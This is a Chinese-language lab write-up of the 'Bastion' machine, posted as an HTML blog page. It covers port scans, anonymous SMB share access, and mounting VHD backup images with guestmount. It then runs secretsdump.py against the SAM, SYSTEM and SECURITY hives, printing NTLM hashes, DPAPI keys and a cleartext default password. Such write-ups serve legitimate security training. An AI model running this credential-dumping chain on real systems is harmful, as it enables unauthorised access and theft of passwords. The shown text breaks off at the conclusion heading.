@@ -1,0 +1,823 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/99706997?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="
+# 信息收集
+
+tcp
+
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# nmap --min-rate 1000 -p- 10.129.136.29
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 12:42 CST
+Nmap scan report for 10.129.136.29 (10.129.136.29)
+Host is up (0.20s latency).
+Not shown: 65522 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5985/tcp  open  wsman
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 76.57 seconds
+
+
+┌──(root㉿MJ)-[/tmp/test]
+└─# nmap -sV -sC -O -p$port 10.129.136.29
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 12:45 CST
+Nmap scan report for 10.129.136.29 (10.129.136.29)
+Host is up (0.14s latency).
+
+PORT      STATE SERVICE      VERSION
+22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
+| ssh-hostkey:
+|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
+|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
+|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows Server 2012 or 2012 R2 (97%), Microsoft Windows Server 2012 (95%), Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1 (94%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows Server 2016 or Server 2019 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows Server 2012 or Server 2012 R2 (93%), Microsoft Windows 7 or Windows Server 2008 R2 or Windows 8.1 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+```
+开放了ssh，smb，winrm还有几个http，先从smb入手了
+
+## 🧐 Nmap 结果分析：5985 端口
+
+Nmap 的服务探测 (Service Detection) 在这种情况下是**正确的**，但它识别的是**基础技术栈**，而不是**上层协议**。">
+<meta property="og:title" content="Bastion">
+<meta property="og:description" content="
+# 信息收集
+
+tcp
+
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# nmap --min-rate 1000 -p- 10.129.136.29
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 12:42 CST
+Nmap scan report for 10.129.136.29 (10.129.136.29)
+Host is up (0.20s latency).
+Not shown: 65522 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5985/tcp  open  wsman
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 76.57 seconds
+
+
+┌──(root㉿MJ)-[/tmp/test]
+└─# nmap -sV -sC -O -p$port 10.129.136.29
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 12:45 CST
+Nmap scan report for 10.129.136.29 (10.129.136.29)
+Host is up (0.14s latency).
+
+PORT      STATE SERVICE      VERSION
+22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
+| ssh-hostkey:
+|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
+|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
+|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows Server 2012 or 2012 R2 (97%), Microsoft Windows Server 2012 (95%), Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1 (94%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows Server 2016 or Server 2019 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows Server 2012 or Server 2012 R2 (93%), Microsoft Windows 7 or Windows Server 2008 R2 or Windows 8.1 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+```
+开放了ssh，smb，winrm还有几个http，先从smb入手了
+
+## 🧐 Nmap 结果分析：5985 端口
+
+Nmap 的服务探测 (Service Detection) 在这种情况下是**正确的**，但它识别的是**基础技术栈**，而不是**上层协议**。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://faabbi.github.io/post/Bastion.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/99706997?v=4">
+<title>Bastion</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">Bastion</h1>
+<div class="title-right">
+    <a href="https://faabbi.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/faabbi/faabbi.github.io/issues/36" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>信息收集</h1>
+<p>tcp</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> nmap --min-rate 1000 -p- 10.129.136.29</span>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 12:42 CST
+Nmap scan report <span class="pl-k">for</span> 10.129.136.29 (10.129.136.29)
+Host is up (0.20s latency).
+Not shown: 65522 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5985/tcp  open  wsman
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 76.57 seconds
+
+
+┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -O -p$port 10.129.136.29</span>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 12:45 CST
+Nmap scan report <span class="pl-k">for</span> 10.129.136.29 (10.129.136.29)
+Host is up (0.14s latency).
+
+PORT      STATE SERVICE      VERSION
+22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
+<span class="pl-k">|</span> ssh-hostkey:
+<span class="pl-k">|</span>   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
+<span class="pl-k">|</span>   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
+<span class="pl-k">|</span>_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+<span class="pl-k">|</span>_http-title: Not Found
+<span class="pl-k">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+<span class="pl-k">|</span>_http-title: Not Found
+<span class="pl-k">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows Server 2012 or 2012 R2 (97%), Microsoft Windows Server 2012 (95%), Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1 (94%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows Server 2016 or Server 2019 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows Server 2012 or Server 2012 R2 (93%), Microsoft Windows 7 or Windows Server 2008 R2 or Windows 8.1 (92%)
+No exact OS matches <span class="pl-k">for</span> host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012<span class="pl-k">;</span> CPE: cpe:/o:microsoft:windows</pre></div>
+<p>开放了ssh，smb，winrm还有几个http，先从smb入手了</p>
+<h2>🧐 Nmap 结果分析：5985 端口</h2>
+<p>Nmap 的服务探测 (Service Detection) 在这种情况下是<strong>正确的</strong>，但它识别的是<strong>基础技术栈</strong>，而不是<strong>上层协议</strong>。</p>
+<h3>1. 结论：5985 <strong>就是</strong> WinRM</h3>
+<p>端口 5985/tcp 是 <strong>Windows Remote Management (WinRM)</strong> 的<strong>标准 HTTP 端口</strong>。</p>
+<ul>
+<li>
+<p><strong>WinRM</strong> 使用 <strong>WS-Management 协议</strong>，该协议通常是通过 <strong>HTTP/HTTPS</strong> 传输的。</p>
+</li>
+<li>
+<p>WinRM 的默认端口是：</p>
+<ul>
+<li>
+<p><strong>5985/tcp</strong> (HTTP)</p>
+</li>
+<li>
+<p><strong>5986/tcp</strong> (HTTPS)</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3>2. Nmap 为什么显示 <code class="notranslate">http</code>？</h3>
+<p>Nmap 报告 <code class="notranslate">Microsoft HTTPAPI httpd 2.0</code> 是因为：</p>
+<ul>
+<li>
+<p><strong>技术基础：</strong> WinRM 监听器依赖于 <strong>Windows HTTP API (HTTPAPI/2.0)</strong> 来接收连接。Nmap 准确地识别了底层 HTTP 协议栈。</p>
+</li>
+<li>
+<p><strong>服务描述：</strong> Nmap 在对 5985 端口进行服务指纹识别时，通常会得到一个标准的 HTTP 响应，但由于这不是一个提供网页的 Web 服务器（例如 IIS 或 Apache），它就报告了底层的 <strong>Microsoft HTTPAPI httpd 2.0</strong>。</p>
+</li>
+</ul>
+<p><strong>关键点：</strong> 如果端口 <strong>5985</strong> 在 Windows 机器上开放，并且报告了 <code class="notranslate">Microsoft HTTPAPI</code>，那么<strong>几乎可以确定它就是 WinRM 服务</strong>。</p>
+<p>udp</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> nmap -sU --top-ports 20 10.129.136.29</span>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 12:42 CST
+Nmap scan report <span class="pl-k">for</span> 10.129.136.29 (10.129.136.29)
+Host is up (0.17s latency).
+
+PORT      STATE         SERVICE
+53/udp    closed        domain
+67/udp    closed        dhcps
+68/udp    closed        dhcpc
+69/udp    closed        tftp
+123/udp   open<span class="pl-k">|</span>filtered ntp
+135/udp   closed        msrpc
+137/udp   open<span class="pl-k">|</span>filtered netbios-ns
+138/udp   open<span class="pl-k">|</span>filtered netbios-dgm
+139/udp   closed        netbios-ssn
+161/udp   closed        snmp
+162/udp   closed        snmptrap
+445/udp   closed        microsoft-ds
+500/udp   open<span class="pl-k">|</span>filtered isakmp
+514/udp   closed        syslog
+520/udp   closed        route
+631/udp   closed        ipp
+1434/udp  closed        ms-sql-m
+1900/udp  closed        upnp
+4500/udp  open<span class="pl-k">|</span>filtered nat-t-ike
+49152/udp closed        unknown
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 48.71 seconds</pre></div>
+<h1>smb</h1>
+<p>基本信息先看一下，一般是能跑出来哪个共享文件夹可匿名访问的，不过这里，我这个有点问题</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> enum4linux -a 10.129.136.29</span>
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Dec  8 12:50:49 2025
+
+ =========================================( Target Information )=========================================
+
+Target ........... 10.129.136.29
+RID Range ........ 500-550,1000-1050
+Username ......... <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>
+Password ......... <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ===========================( Enumerating Workgroup/Domain on 10.129.136.29 )===========================
+
+
+[E] Can<span class="pl-s"><span class="pl-pds">'</span>t find workgroup/domain</span>
+<span class="pl-s"></span>
+<span class="pl-s"></span>
+<span class="pl-s"></span>
+<span class="pl-s"> ===============================( Nbtstat Information for 10.129.136.29 )===============================</span>
+<span class="pl-s"></span>
+<span class="pl-s">Looking up status of 10.129.136.29</span>
+<span class="pl-s">No reply from 10.129.136.29</span>
+<span class="pl-s"></span>
+<span class="pl-s"> ===================================( Session Check on 10.129.136.29 )===================================</span>
+<span class="pl-s"></span>
+<span class="pl-s"></span>
+<span class="pl-s">[E] Server doesn<span class="pl-pds">'</span></span>t allow session using username <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>, password <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>.  Aborting remainder of tests.
+
+┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> smbclient -L 10.129.136.29 -N</span>
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        Backups         Disk
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC</pre></div>
+<p>列出来这些，大概率就是Backups了，有个文件提示别dump到本地</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> cat note.txt</span>
+
+Sysadmins: please don<span class="pl-s"><span class="pl-pds">'</span>t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.</span></pre></div>
+<p>在这可以发现几个vhd文件，不过windows的这种虚拟磁盘文件都很大，所以下到本地太慢了</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">mb: <span class="pl-cce">\W</span>indowsImageBackup<span class="pl-cce">\L</span>4mpje-PC<span class="pl-cce">\B</span>ackup 2019-02-22 124351<span class="pl-cce">\&gt;</span> ls
+  <span class="pl-c1">.</span>                                  Dn        0  Fri Feb 22 20:45:32 2019
+  ..                                 Dn        0  Fri Feb 22 20:45:32 2019
+  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 20:44:03 2019
+  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 20:45:32 2019
+  BackupSpecs.xml                    An     1186  Fri Feb 22 20:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml     An     1078  Fri Feb 22 20:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml     An     8930  Fri Feb 22 20:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml     An     6542  Fri Feb 22 20:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml     An     2894  Fri Feb 22 20:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml     An     1488  Fri Feb 22 20:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml     An     1484  Fri Feb 22 20:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml     An     3844  Fri Feb 22 20:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml     An     3988  Fri Feb 22 20:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml     An     7110  Fri Feb 22 20:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml     An  2374620  Fri Feb 22 20:45:32 2019
+
+                5638911 blocks of size 4096. 1171288 blocks available
+smb: <span class="pl-cce">\W</span>indowsImageBackup<span class="pl-cce">\L</span>4mpje-PC<span class="pl-cce">\B</span>ackup 2019-02-22 124351<span class="pl-cce">\&gt;</span></pre></div>
+<p>直接这样把磁盘挂载上去</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> guestmount --add '/mnt/vhd/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd' --inspector --ro /mnt/vhd1</span>
+Warning: program compiled against libxml 215 using older 214
+guestmount: no operating system was found on this disk
+
+If using guestfish ‘-i’ option, remove this option and instead
+use the commands ‘run’ followed by ‘list-filesystems’.
+You can <span class="pl-k">then</span> mount filesystems you want by hand using the
+‘mount’ or ‘mount-ro’ command.
+
+If using guestmount ‘-i’, remove this option and choose the
+filesystem(s) you want to see by manually adding ‘-m’ option(s).
+Use ‘virt-filesystems’ to see what filesystems are available.
+
+If using other virt tools, this disk image won’t work
+with these tools.  Use the guestfish equivalent commands
+(see the virt tool manual page).</pre></div>
+<p>不过第一个挂载在os识别失败了，可能不是正常的目录结构</p>
+<p>可以这样挂载，先识别下然后指定挂载设备</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> virt-filesystems --long -a '/mnt/vhd/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd'</span>
+Warning: program compiled against libxml 215 using older 214
+Name       Type        VFS   Label            Size       Parent
+/dev/sda1  filesystem  ntfs  System Reserved  104853504  -
+
+┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> guestmount --add '/mnt/vhd/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd' --ro - /mnt/vhd1</span>
+
+┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> virt-filesystems --long -a '/mnt/vhd/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd'</span>
+
+┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> guestmount --add '/mnt/vhd/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd' --ro -m /dev/sda1 /mnt/vhd1</span>
+Warning: program compiled against libxml 215 using older 214</pre></div>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> guestmount --add '/mnt/vhd/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd' --inspector --ro /mnt/vhd2</span>
+Warning: program compiled against libxml 215 using older 214</pre></div>
+<p>第二个挂载成功了</p>
+<p>不过明显第一个没什么价值</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> cd /mnt/vhd1</span>
+
+┌──(root㉿MJ)-[/mnt/vhd1]
+└─<span class="pl-c"><span class="pl-c">#</span> ls</span>
+ Boot   bootmgr   BOOTSECT.BAK  <span class="pl-s"><span class="pl-pds">'</span>System Volume Information<span class="pl-pds">'</span></span>
+
+┌──(root㉿MJ)-[/mnt/vhd1]
+└─<span class="pl-c"><span class="pl-c">#</span> cd ..</span>
+
+┌──(root㉿MJ)-[/mnt]
+└─<span class="pl-c"><span class="pl-c">#</span> cd vhd2</span>
+
+┌──(root㉿MJ)-[/mnt/vhd2]
+└─<span class="pl-c"><span class="pl-c">#</span> ls</span>
+<span class="pl-s"><span class="pl-pds">'</span>$Recycle.Bin<span class="pl-pds">'</span></span>   config.sys                pagefile.sys   ProgramData      Recovery                     Users
+ autoexec.bat   <span class="pl-s"><span class="pl-pds">'</span>Documents and Settings<span class="pl-pds">'</span></span>   PerfLogs      <span class="pl-s"><span class="pl-pds">'</span>Program Files<span class="pl-pds">'</span></span>  <span class="pl-s"><span class="pl-pds">'</span>System Volume Information<span class="pl-pds">'</span></span>   Windows</pre></div>
+<p>现在去吧system里的SAM，SYSTEM，SECURITY都拉到本地，破解一手密码</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(.venv)─(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL</span>
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
+
+[<span class="pl-k">*</span>] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
+[<span class="pl-k">*</span>] Dumping <span class="pl-k">local</span> SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+[<span class="pl-k">*</span>] Dumping cached domain logon information (domain/username:hash)
+[<span class="pl-k">*</span>] Dumping LSA Secrets
+[<span class="pl-k">*</span>] DefaultPassword
+(Unknown User):bureaulampje
+[<span class="pl-k">*</span>] DPAPI_SYSTEM
+dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
+dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
+[<span class="pl-k">*</span>] Cleaning up...</pre></div>
+<p>这里出了个默认密码</p>
+<h2>🔑 LSA Secrets 和 <code class="notranslate">DefaultPassword</code> 的作用</h2>
+<p>LSA Secrets 是存储在 Windows 注册表 <strong><code class="notranslate">SECURITY</code></strong> 配置单元中的一类敏感数据。</p>
+<h3>1. 什么是 LSA Secrets?</h3>
+<p><strong>LSA (Local Security Authority)</strong> 是 Windows 操作系统中的一个保护进程，负责管理本地安全策略、用户身份验证和密钥。LSA Secrets 是 LSA 存储的各种<strong>加密数据</strong>，用于系统内部操作，包括：</p>
+<ul>
+<li>
+<p>服务账户的明文密码。</p>
+</li>
+<li>
+<p>计算机账户在加入域时生成的密码。</p>
+</li>
+<li>
+<p>应用程序（如 IIS 或其他服务）可能硬编码存储的凭据。</p>
+</li>
+<li>
+<p>加密文件系统 (EFS) 恢复代理的密码。</p>
+</li>
+</ul>
+<h3>2. <code class="notranslate">DefaultPassword</code> 的来源</h3>
+<p><code class="notranslate">DefaultPassword</code> 是 LSA Secrets 中一个<strong>非标准但常见</strong>的条目，它通常是由于以下原因之一被写入注册表：</p>
+<ul>
+<li>
+<p><strong>系统/服务配置：</strong> 某些第三方服务、内部应用程序或自定义脚本在安装或配置过程中，会利用 LSA 机制存储一个用于<strong>默认连接</strong>或<strong>服务运行</strong>的密码。</p>
+</li>
+<li>
+<p><strong>配置错误：</strong> 尽管 LSA Secrets 是加密的，但它仍然是一个集中存储敏感凭据的位置。开发人员或系统管理员有时会错误地使用 LSA 来存储一个<strong>通用密码</strong>或<strong>回退密码</strong>，特别是用于数据库、邮件服务器或备份服务的连接。</p>
+</li>
+</ul>
+<h3>3. <code class="notranslate">secretsdump.py</code> 如何找到它？</h3>
+<p><code class="notranslate">secretsdump.py</code> 的作用就是利用 <strong><code class="notranslate">SYSTEM</code></strong> 文件中的密钥来解密 <strong><code class="notranslate">SECURITY</code></strong> 文件中的 LSA Secrets。它会扫描并解密所有找到的 LSA Secret 条目，并将它们以明文形式显示出来，其中就包括了 <code class="notranslate">DefaultPassword</code> 这个条目及其对应的明文值 <code class="notranslate">bureaulampje</code>。</p>
+<hr>
+<h2>结论</h2>
